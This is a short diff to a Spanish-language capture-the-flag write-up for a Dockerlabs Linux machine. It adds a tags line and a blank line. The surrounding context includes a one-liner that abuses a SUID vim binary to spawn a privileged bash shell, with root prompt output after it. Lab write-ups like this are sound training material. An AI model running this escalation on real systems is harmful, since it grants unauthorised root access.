@@ -3,6 +3,8 @@
 **Plataforma:** Dockerlabs  
 **Sistema Operativo:** Linux  
 
+> **Tags:** `Linux` `Web` `PHP` `Burp Suite` `Command Injection` `RCE` `SUID`
+
 # INSTALACIÓN
 
 Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.
@@ -191,6 +193,7 @@ Finalmente, lo conseguimos con el comando:
 ```bash
 /usr/bin/vim.basic -c ':py3 import os; os.execl("/bin/bash", "bash", "-pc", "reset; exec bash -p")'
 ```
+
 Info:
 ```
 bash-5.2# whoami
